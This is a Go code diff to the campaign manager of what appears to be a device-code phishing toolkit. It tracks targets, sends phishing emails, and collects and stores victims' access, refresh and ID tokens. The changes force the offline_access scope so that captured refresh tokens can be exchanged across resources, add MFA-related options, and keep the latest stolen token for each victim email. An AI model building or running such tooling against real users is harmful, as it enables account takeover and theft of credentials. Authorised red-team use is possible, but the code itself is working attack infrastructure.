@@ -65,6 +65,10 @@ type Campaign struct {
 	// when new sessions are created (e.g. from a QR scan confirm).
 	notify chan struct{}
 
+	// done is closed by Stop() to signal SSE subscribers to exit.
+	done     chan struct{}
+	doneOnce sync.Once
+
 	ArtifactsPath string `json:"-"`
 	ExportsPath   string `json:"-"`
 
@@ -77,10 +81,17 @@ type Campaign struct {
 	QRBaseURL      string `json:"qr_base_url,omitempty"`
 	QRDCTemplateID string `json:"qr_dc_template_id,omitempty"`
 	QRDCProfileID  string `json:"qr_dc_profile_id,omitempty"`
+
+	// OwnerID is the user ID that created this campaign. Empty = legacy/admin-owned.
+	OwnerID string `json:"owner_id,omitempty"`
 }
 
 // NotifyCh returns the channel SSE handlers should select on for push updates.
 func (c *Campaign) NotifyCh() <-chan struct{} { return c.notify }
+
+// DoneCh returns a channel that is closed when the campaign is stopped.
+// SSE handlers should select on this to exit when the server stops the campaign.
+func (c *Campaign) DoneCh() <-chan struct{} { return c.done }
 
 // GetQRConfig safely returns the QR DC template and profile IDs under the read lock.
 func (c *Campaign) GetQRConfig() (templateID, profileID string) {
@@ -111,20 +122,31 @@ type Manager struct {
 
 	tenantID string
 	clientID string
-	scope    string
-	pollSec  int
+	scope      string
+	captureV1  bool
+	requireMFA bool
+	debug      bool
+	pollSec    int
 
 	artifactsPath string
 	exportsPath   string
 	db            *store.Store
 }
 
-func NewManager(tenantID, clientID, scope string, pollSec int, artifactsPath, exportsPath string, db *store.Store) *Manager {
+func NewManager(tenantID, clientID, scope string, pollSec int, captureV1, requireMFA, debug bool, artifactsPath, exportsPath string, db *store.Store) *Manager {
+	// Always include offline_access so captured refresh tokens can be
+	// cross-resource exchanged (e.g. for Token Exchange / MFA operations).
+	if !strings.Contains(scope, "offline_access") {
+		scope = strings.TrimSpace(scope) + " offline_access"
+	}
 	return &Manager{
 		campaigns:     make(map[string]*Campaign),
 		tenantID:      tenantID,
 		clientID:      clientID,
 		scope:         scope,
+		captureV1:     captureV1,
+		requireMFA:    requireMFA,
+		debug:         debug,
 		pollSec:       pollSec,
 		artifactsPath: artifactsPath,
 		exportsPath:   exportsPath,
@@ -178,7 +200,7 @@ func (m *Manager) Load() error {
 				RefreshToken:      t.RefreshToken,
 				IDToken:           t.IDToken,
 				TokenType:         t.TokenType,
-				ExpiresIn:         t.ExpiresIn,
+				ExpiresIn:         devicecode.FlexInt(t.ExpiresIn),
 				Scope:             t.Scope,
 				TargetID:          t.TargetID,
 				TargetEmail:       t.TargetEmail,
@@ -219,6 +241,7 @@ func (m *Manager) Load() error {
 			ArtifactsPath:  row.ArtifactsPath,
 			ExportsPath:    row.ExportsPath,
 			notify:         make(chan struct{}, 1),
+			done:           make(chan struct{}),
 			Targets:        tstore,
 			Results:        results,
 			ResultsByID:    byID,
@@ -226,6 +249,7 @@ func (m *Manager) Load() error {
 			QRBaseURL:      row.QRBaseURL,
 			QRDCTemplateID: row.QRDCTemplateID,
 			QRDCProfileID:  row.QRDCProfileID,
+			OwnerID:        row.OwnerID,
 		}
 		m.campaigns[c.ID] = c
 	}
@@ -249,6 +273,7 @@ func (m *Manager) saveCampaign(c *Campaign) {
 		QRBaseURL:      c.QRBaseURL,
 		QRDCTemplateID: c.QRDCTemplateID,
 		QRDCProfileID:  c.QRDCProfileID,
+		OwnerID:        c.OwnerID,
 	}
 	c.mu.RUnlock()
 	if err := m.db.UpsertCampaign(row); err != nil {
@@ -256,7 +281,7 @@ func (m *Manager) saveCampaign(c *Campaign) {
 	}
 }
 
-func (m *Manager) NewCampaign(id, name, description string) *Campaign {
+func (m *Manager) NewCampaign(id, name, description, ownerID string) *Campaign {
 	c := &Campaign{
 		ID:            id,
 		Name:          name,
@@ -265,17 +290,36 @@ func (m *Manager) NewCampaign(id, name, description string) *Campaign {
 		CreatedAt:     time.Now().UTC(),
 		Targets:       targets.NewStore(),
 		notify:        make(chan struct{}, 1),
+		done:          make(chan struct{}),
 		ArtifactsPath: filepath.Join(m.artifactsPath, id),
 		ExportsPath:   filepath.Join(m.exportsPath, id),
 		Results:       make([]*devicecode.TokenResult, 0),
 		ResultsByID:   make(map[string]*devicecode.TokenResult),
 		EmailResults:  make([]*mailer.EmailSendResult, 0),
+		OwnerID:       ownerID,
 	}
 	m.mu.Lock()
 	m.campaigns[id] = c
 	m.mu.Unlock()
 	m.saveCampaign(c)
 	return c
+}
+
+// Save persists an already-registered campaign (e.g. after a rename or target import).
+func (m *Manager) Save(c *Campaign) {
+	m.saveCampaign(c)
+}
+
+// Rename updates the campaign's name and description in-memory.
+func (c *Campaign) Rename(name, description string) {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	if name != "" {
+		c.Name = name
+	}
+	if description != "" {
+		c.Description = description
+	}
 }
 
 // NotifySSE wakes any SSE handler watching this campaign so it sends an
@@ -345,7 +389,7 @@ func (m *Manager) Launch(campaignID string) error {
 	}
 	c.mu.Unlock()
 
-	engine := devicecode.NewEngine(m.tenantID, m.clientID, m.scope, m.pollSec)
+	engine := devicecode.NewEngine(m.tenantID, m.clientID, m.scope, m.pollSec, m.captureV1, m.requireMFA, m.debug)
 	ctx, cancel := context.WithCancel(context.Background())
 
 	c.mu.Lock()
@@ -390,8 +434,8 @@ func (m *Manager) Launch(campaignID string) error {
 			TargetEmail:     dcr.TargetEmail,
 			UserCode:        dcr.UserCode,
 			VerificationURI: dcr.VerificationURI,
-			ExpiresIn:       dcr.ExpiresIn,
-			IntervalSec:     dcr.Interval,
+			ExpiresIn:       int(dcr.ExpiresIn),
+			IntervalSec:     int(dcr.Interval),
 			Message:         dcr.Message,
 			IssuedAt:        dcr.IssuedAt,
 			ExpiresAt:       dcr.ExpiresAt,
@@ -419,7 +463,19 @@ func (m *Manager) collectResults(ctx context.Context, c *Campaign) {
 				return
 			}
 			c.mu.Lock()
-			c.Results = append(c.Results, result)
+			// Replace any existing entry for the same email so the most recent
+			// token wins and duplicates don't accumulate across relaunches.
+			replaced := false
+			for i, r := range c.Results {
+				if strings.EqualFold(r.TargetEmail, result.TargetEmail) {
+					c.Results[i] = result
+					replaced = true
+					break
+				}
+			}
+			if !replaced {
+				c.Results = append(c.Results, result)
+			}
 			c.ResultsByID[result.TargetID] = result
 			c.mu.Unlock()
 
@@ -432,7 +488,7 @@ func (m *Manager) collectResults(ctx context.Context, c *Campaign) {
 				RefreshToken:     result.RefreshToken,
 				IDToken:          result.IDToken,
 				TokenType:        result.TokenType,
-				ExpiresIn:        result.ExpiresIn,
+				ExpiresIn:        int(result.ExpiresIn),
 				Scope:            result.Scope,
 				UPN:              result.UserPrincipalName,
 				RedeemedAt:       result.RedeemedAt,
@@ -466,6 +522,7 @@ func (m *Manager) Stop(campaignID string) error {
 	c.CompletedAt = &now
 	c.Status = StatusAborted
 	c.mu.Unlock()
+	c.doneOnce.Do(func() { close(c.done) })
 	m.saveCampaign(c)
 	return nil
 }
@@ -546,7 +603,7 @@ func (m *Manager) GetTokenByTargetID(campaignID, targetID string) (*devicecode.T
 		RefreshToken:      row.RefreshToken,
 		IDToken:           row.IDToken,
 		TokenType:         row.TokenType,
-		ExpiresIn:         row.ExpiresIn,
+		ExpiresIn:         devicecode.FlexInt(row.ExpiresIn),
 		Scope:             row.Scope,
 		TargetID:          row.TargetID,
 		TargetEmail:       row.TargetEmail,
@@ -635,7 +692,25 @@ func (m *Manager) GetTokens(campaignID string) ([]*devicecode.TokenResult, error
 	}
 	c.mu.RLock()
 	defer c.mu.RUnlock()
-	return c.Results, nil
+	// Deduplicate by email, keeping the most recently captured token.
+	// This handles duplicates that may have been loaded from DB at startup
+	// (e.g. the same person captured tokens across multiple relaunches with
+	// different target IDs).
+	seen := make(map[string]*devicecode.TokenResult, len(c.Results))
+	for _, r := range c.Results {
+		key := strings.ToLower(r.TargetEmail)
+		if key == "" {
+			key = r.TargetID
+		}
+		if existing, ok := seen[key]; !ok || r.RedeemedAt.After(existing.RedeemedAt) {
+			seen[key] = r
+		}
+	}
+	out := make([]*devicecode.TokenResult, 0, len(seen))
+	for _, r := range seen {
+		out = append(out, r)
+	}
+	return out, nil
 }
 
 // SendEmails dispatches phishing emails to all targets with active device code sessions.
@@ -789,8 +864,8 @@ func (m *Manager) LaunchForTarget(campaignID, targetID string) error {
 		TargetEmail:     dcr.TargetEmail,
 		UserCode:        dcr.UserCode,
 		VerificationURI: dcr.VerificationURI,
-		ExpiresIn:       dcr.ExpiresIn,
-		IntervalSec:     dcr.Interval,
+		ExpiresIn:       int(dcr.ExpiresIn),
+		IntervalSec:     int(dcr.Interval),
 		Message:         dcr.Message,
 		IssuedAt:        dcr.IssuedAt,
 		ExpiresAt:       dcr.ExpiresAt,
@@ -841,8 +916,8 @@ func (m *Manager) RegenerateCode(campaignID, targetID string) error {
 		TargetEmail:     dcr.TargetEmail,
 		UserCode:        dcr.UserCode,
 		VerificationURI: dcr.VerificationURI,
-		ExpiresIn:       dcr.ExpiresIn,
-		IntervalSec:     dcr.Interval,
+		ExpiresIn:       int(dcr.ExpiresIn),
+		IntervalSec:     int(dcr.Interval),
 		Message:         dcr.Message,
 		IssuedAt:        dcr.IssuedAt,
 		ExpiresAt:       dcr.ExpiresAt,
